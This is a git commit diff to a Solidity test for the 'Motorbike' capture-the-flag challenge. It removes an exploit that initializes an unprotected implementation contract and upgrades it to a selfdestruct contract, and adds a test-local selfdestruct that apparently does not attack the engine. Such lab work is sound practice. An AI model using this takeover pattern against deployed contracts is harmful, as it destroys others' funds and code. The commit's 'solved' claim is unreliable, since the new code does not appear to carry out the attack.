20b048c932523a568a893f46ba23c3120741141d
Evgenii Kireev <kireev228@gmail.com>
2025-03-16 10:44:51 -0300

    solved motorbike

--- test/Motorbike.t.sol
+++ test/Motorbike.t.sol
@@ -1,34 +1,26 @@
 import {Test, console} from "forge-std/Test.sol";
 import {Engine, Motorbike} from "../src/Motorbike.sol";
 
-contract SelfDestroy {
-    function destroy() public {
-        console.log("!!!_DESTROY_!!!");
-        selfdestruct(payable(msg.sender));
-    }
-}
-
 contract MotorbikeTest is Test {
     Engine engine;
     Motorbike motorbike;
-    SelfDestroy selfDestroy;
 
     address attacker = makeAddr("attacker");
 
     function setUp() public {
         engine = new Engine();
-        selfDestroy = new SelfDestroy();
         motorbike = new Motorbike(address(engine));
     }
 
     function testAttack() public {
-        _logAddress();
         vm.startPrank(attacker);
         engine.initialize();
-
-        bytes memory data = abi.encodeWithSignature("destroy()");
-        engine.upgradeToAndCall(address(selfDestroy), data);
+        destroyMotorbike();
         vm.stopPrank();
+    }
+
+    function destroyMotorbike() public {
+        selfdestruct(payable(msg.sender));
     }
 
     function _logAddress() internal {
